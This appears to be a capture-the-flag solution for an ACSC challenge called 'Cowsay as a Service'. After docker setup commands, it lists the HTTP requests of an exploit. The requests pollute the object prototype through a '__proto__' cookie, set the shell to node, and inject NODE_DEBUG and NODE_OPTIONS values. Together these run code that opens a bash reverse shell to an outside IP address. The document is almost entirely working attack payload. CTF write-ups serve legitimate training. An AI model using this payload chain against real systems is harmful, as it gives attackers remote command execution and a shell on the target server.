# Cowsay as a Service

```bash
docker build . -t acsc-cowsay
docker run -p 3000:3000 -e FLAG=ACSC{} acsc-cowsay
```

# Payload

```
POST /setting/shell
cookie: username=__proto__


{"value":"/usr/local/bin/node"}
```

```
GET /cowsay?say=a
cookie: username=__proto__
```

```
POST /setting/env
cookie: username=__proto__


{"value":{
  "NODE_DEBUG" : "require(\"child_process\").execSync(\"bash -c 'bash -i >& /dev/tcp/52.231.78.247/4444 0>&1' \");//",
  "NODE_OPTIONS" : "-r /proc/self/environ"
}}
```